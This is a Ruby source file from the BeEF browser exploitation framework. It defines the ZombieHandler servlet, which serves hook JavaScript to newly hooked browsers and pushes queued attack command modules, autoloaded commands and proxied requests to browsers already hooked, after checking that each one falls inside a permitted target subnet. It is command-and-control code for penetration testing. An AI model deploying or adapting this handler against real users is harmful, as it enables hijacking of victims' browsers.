module BeEF
  
  #
  # This class handles connections from zombies to the framework.
  #
  class ZombieHandler < WEBrick::HTTPServlet::AbstractServlet
    
    include BeEF::Server::Modules::Common
    include BeEF::Server::Modules::Requester
    
    attr_reader :guard
    
    def initialize(config)
      @guard = Mutex.new
      @cmd_opts = BeEF::Console::CommandLine.parse
      @session = BeEF::UI::Session.instance
    end
    
    #
    # This method processes the http requests sent by a zombie to the framework.
    # It will update the database to add or update the current zombie and deploy
    # some command modules or plugins.
    #
    def do_GET(request, response)
      @body = ''
      @params = request.query
      @request = request
      @response = response
      config = BeEF::Configuration.instance

      # check source ip address of browser
      permitted_hooking_subnet = config.get('permitted_hooking_subnet')
      target_network = IPAddr.new(permitted_hooking_subnet)
      if not target_network.include?(request.peeraddr[3].to_s)
        BeEF::Logger.instance.register('Target Range', "Attempted hook from out of target range browser (#{request.peeraddr[3]}) rejected.")
        @response.set_error(nil)
        return
      end

      # get zombie if already hooked the framework
      hook_session_id = request.get_hook_session_id()
      hooked_browser = BeEF::Models::Zombie.first(:session => hook_session_id) if not hook_session_id.nil?
      
      if not hooked_browser # is a new browser so return instructions to set up the hook
        
        # generate the instructions to hook the browser
        host_name = @request.host # get the host from the HOST attribute in the HTTP header
        raise WEBrick::HTTPStatus::BadRequest, "Invalid host name" if not Filter.is_valid_hostname?(host_name)
        build_beefjs!(host_name)
      
      else # is a known browseer so send instructions 
      
        # record the last poll from the browser
        hooked_browser.lastseen = Time.new.to_i
      
        hooked_browser.count!
        hooked_browser.save
      
        execute_plugins!

        # add all availible command module instructions to the response
        zombie_commands = BeEF::Models::Command.all(:zombie_id => hooked_browser.id, :instructions_sent => false)
        zombie_commands.each{|command| add_command_instructions(command, hooked_browser)}

        # add all availible autoloading command module instructions to the response
        autoloadings = BeEF::Models::Command.all(:autoloadings => { :in_use => true })
        autoloadings.each {|command| add_command_instructions(command, hooked_browser)}

        # executes the requester
        requester_run(hooked_browser)
        
      end

      # set response headers and body
      response.set_no_cache
      response.header['Content-Type'] = 'text/javascript' 
      response.header['Access-Control-Allow-Origin'] = '*'
      response.header['Access-Control-Allow-Methods'] = 'POST, GET'
      response.body = @body
      
    end
      
    alias do_POST do_GET
    
    private
    
    # Object representing the HTTP request
    @request
    
    # Object representing the HTTP response
    @response
    
    # A string containing the list of BeEF components active in the hooked browser
    @beef_js_cmps
    
  end
  
end
